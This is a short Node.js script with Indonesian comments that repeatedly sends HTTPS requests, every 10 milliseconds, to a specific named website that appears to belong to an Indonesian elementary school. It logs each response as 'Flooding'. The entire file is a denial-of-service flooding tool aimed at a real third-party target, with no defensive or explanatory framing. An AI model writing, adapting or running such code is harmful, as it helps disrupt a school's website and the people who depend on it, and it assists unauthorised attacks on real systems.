const https = require('https');  // Jika menggunakan https
const targetUrl = 'https://sdncipedak05.sch.id/';  // Pastikan URL valid dengan 'https://'

const flood = () => {
  setInterval(() => {
    https.get(targetUrl, (res) => {
      console.log(`Flooding ${targetUrl}... Status: ${res.statusCode}`);
    }).on('error', (err) => {
      console.log('Error:', err);
    });
  }, 10);  // set interval untuk request
};

flood();  // Mulai flood
